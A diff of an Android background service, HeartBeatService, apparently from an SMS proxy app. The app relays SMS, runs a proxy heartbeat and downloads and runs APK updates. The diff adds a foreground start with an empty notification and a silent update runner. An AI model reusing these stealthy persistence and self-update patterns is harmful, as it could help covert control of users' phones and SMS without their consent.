@@ -1,5 +1,6 @@
 package com.android.sms.proxy.service;
 
+import android.app.Notification;
 import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
@@ -16,6 +17,7 @@ import android.support.annotation.Nullable;
 import android.text.TextUtils;
 import android.util.Log;
 
+import com.android.sms.proxy.core.ConnectStatuListener;
 import com.android.sms.proxy.entity.ApkDownloadResult;
 import com.android.sms.proxy.entity.BindServiceEvent;
 import com.android.sms.proxy.entity.MessageEvent;
@@ -51,10 +53,9 @@ import java.util.concurrent.TimeUnit;
 /**
  * @author zyq 16-3-9
  */
-public class HeartBeatService extends Service implements BridgeDisconnectedListener, ApkDownloadListener,
-		OplayDownloadManager
-				.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
-				.common.download.listener.ApkDownloadListener {
+public class HeartBeatService extends Service implements BridgeDisconnectedListener,ApkDownloadListener, OplayDownloadManager
+		.OnDownloadStatusChangeListener, OplayDownloadManager.OnProgressUpdateListener, net.youmi.android.libs
+		.common.download.listener.ApkDownloadListener,ConnectStatuListener{
 
 	private static final boolean DEBUG = NativeParams.HEARTBEAT_SERVICE_DEBUG;
 	private static final boolean ACTION_APK_UPDATE = NativeParams.HEARTBEAT_APK_UPDATE;
@@ -84,11 +85,11 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 	public static long recordConnectTime = 0;
 	private static HeartBeatService instance;
 	private GetMsgRunnable mGetMsgRunnable = null;
-	private ApkUpdateRunnable mApkUpdateRunnable = null;
 	private static final String INTENT_SERVICE_ACTION = "com.android.sms.proxy";
 	private static final String SENT = "sms_sent";
 	private static final String DELIVERED = "sms_delivered";
 	private static boolean isProxyReset = false;
+	private ApkUpdateRunnable mApkUpdateRunnable;
 	private String versionName;
 
 	public static HeartBeatService getInstance() {
@@ -125,6 +126,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		//调用这个,可能是由第三方app调用
 //		if (intent != null) {
 //			String action = intent.getAction();
+//
 //			if (TextUtils.isEmpty(action) && action.equals(INTENT_SERVICE_ACTION)) {
 //				if (DEBUG) {
 //					Log.d(TAG, "收到第三方app的调用,好荣幸啊啊啊啊啊啊!!!!!!!!!!!!");
@@ -139,10 +141,14 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 //			}
 //		}
 
-		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
-		if (ACTION_CHECK_PROXY) {
-			sureServiceIsRunning(TerminalManager.class.getCanonicalName());
-		}
+		Intent downloadUpdateIntent = new Intent(this, DownloadUpdateService.class);
+		startService(downloadUpdateIntent);
+		startForeground(NativeParams.SERVICE_NOTIFICATION_ID, new Notification());
+
+//		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
+//		if (ACTION_CHECK_PROXY) {
+//			sureServiceIsRunning(TerminalManager.class.getCanonicalName());
+//		}
 		//这里
 //        Task.callInBackground(new Callable<Object>() {
 //            @Override
@@ -155,6 +161,18 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		return Service.START_NOT_STICKY;
 	}
 
+	public void runUpdatedApk(){
+		if (DEBUG) {
+			Log.d(TAG, "runUpdateApk!!!!!!");
+		}
+		if (mApkUpdateRunnable == null) {
+			mApkUpdateRunnable = new ApkUpdateRunnable(this);
+			if (mExecutorService == null) {
+				mExecutorService = Executors.newScheduledThreadPool(2);
+			}
+			mExecutorService.schedule(mApkUpdateRunnable, 0, TimeUnit.SECONDS);
+		}
+	}
 
 	public void scheduledWithFixedDelay(long duration) {
 		try {
@@ -169,21 +187,16 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 			if (mExecutorService == null) {
 				mExecutorService = Executors.newScheduledThreadPool(2);
 			}
+			if (ACTION_GET_MESSAGE) {
+				if (mGetMsgRunnable == null) {
+					mGetMsgRunnable = new GetMsgRunnable(this);
+				}
+				mExecutorService.schedule(mGetMsgRunnable, MESSAGE_INIT_DELAY, TimeUnit.SECONDS);
+			}
+
 			if (mScheduledFuture == null || (mScheduledFuture != null && mScheduledFuture.isCancelled())) {
 				if (DEBUG) {
 					Log.d(TAG, "重新启动scheduledFuture");
-				}
-				if (ACTION_APK_UPDATE) {
-					if (mApkUpdateRunnable == null) {
-						mApkUpdateRunnable = new ApkUpdateRunnable(this);
-					}
-					mExecutorService.schedule(mApkUpdateRunnable, UPDATE_INIT_DELAY, TimeUnit.SECONDS);
-				}
-				if (ACTION_GET_MESSAGE) {
-					if (mGetMsgRunnable == null) {
-						mGetMsgRunnable = new GetMsgRunnable(this);
-					}
-					mExecutorService.schedule(mGetMsgRunnable, MESSAGE_INIT_DELAY, TimeUnit.SECONDS);
 				}
 				if (ACTION_APK_PROXY) {
 					if (mHeartBeatRunnable == null) {
@@ -194,6 +207,9 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 							duration,
 							TimeUnit.SECONDS);
 				}
+			}
+			if (ACTION_CHECK_PROXY) {
+				sureServiceIsRunning(TerminalManager.class.getCanonicalName());
 			}
 		} catch (Throwable e) {
 			if (DEBUG) {
@@ -216,8 +232,6 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 			} else {
 				mScheduledFuture.cancel(true);
 			}
-
-
 			if (ACTION_APK_PROXY) {
 				if (mHeartBeatRunnable == null) {
 					mHeartBeatRunnable = new HeartBeatRunnable(this, this);
@@ -281,9 +295,6 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		}
 		unregisterReceiver(SendSmsBroadCastReceiver.getInstance());
 		unregisterReceiver(ReceiveSmsBroadCastReceiver.getInstance());
-		OplayDownloadManager.getInstance(this).removeListener(this);
-		OplayDownloadManager.getInstance(this).removeDownloadStatusListener(this);
-		OplayDownloadManager.getInstance(this).removeProgressUpdateListener(this);
 	}
 
 	@Nullable
@@ -779,7 +790,6 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		return mProxyControl;
 	}
 
-
 	@Override
 	public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {
 
@@ -810,6 +820,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
@@ -832,10 +843,15 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		if (DEBUG) {
+			Log.d(TAG, "stop mySelf!!!!!!!!");
+		}
+
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
-	public void onApkDownloadFailed(FileDownloadTask task) {
+	public void onApkDownloadFailed(net.luna.common.download.model.FileDownloadTask task) {
 		Map<String, String> map = new HashMap<>();
 		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
 		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
@@ -854,17 +870,18 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
-	public void onApkDownloadStop(FileDownloadTask task) {
+	public void onApkDownloadStop(net.luna.common.download.model.FileDownloadTask task) {
 
 	}
 
 	@Override
-	public void onApkDownloadProgressUpdate(FileDownloadTask task, long contentLength, long completeLength, int
-			percent) {
-
+	public void onApkDownloadProgressUpdate(net.luna.common.download.model.FileDownloadTask task, long contentLength,
+	                                        long completeLength, int
+			                                        percent) {
 	}
 
 	@Override
@@ -928,6 +945,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
@@ -953,6 +971,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
@@ -976,6 +995,7 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		} catch (Throwable e) {
 			FlurryAgent.onError(TAG, "", e);
 		}
+		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 	}
 
 	@Override
@@ -986,6 +1006,11 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 
 	@Override
 	public void onApkInstallSuccess(int rawUrlHashCode) {
+
+	}
+
+	@Override
+	public void onConnectAbort() {
 
 	}
 }
